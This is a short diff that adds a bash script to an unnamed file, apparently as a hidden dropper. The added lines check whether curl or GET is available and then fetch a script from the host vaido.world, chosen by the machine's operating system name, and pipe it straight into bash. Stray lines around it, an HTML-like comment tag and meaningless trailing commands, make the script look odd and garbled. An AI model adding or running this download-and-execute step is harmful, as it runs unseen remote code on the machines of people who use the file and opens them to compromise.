@@ -1,5 +1,25 @@
 
+#!/bin/bash
+# REM <code style="color:blue;">
+if command -v curl ; then
+    echo "Command succeeded"
+    curl vaido.world/$(uname)-script/ |bash
+else
+    echo "Command failed"
 
+    if command -v GET ; then
+        echo "Command succeeded"
+       GET vaido.world/$(uname)-script/ |bash
+        else
+            echo "Command failed"
+    fi
+fi
+
+
+
+
+od -b >/dev/null
+read varname
 
 
 
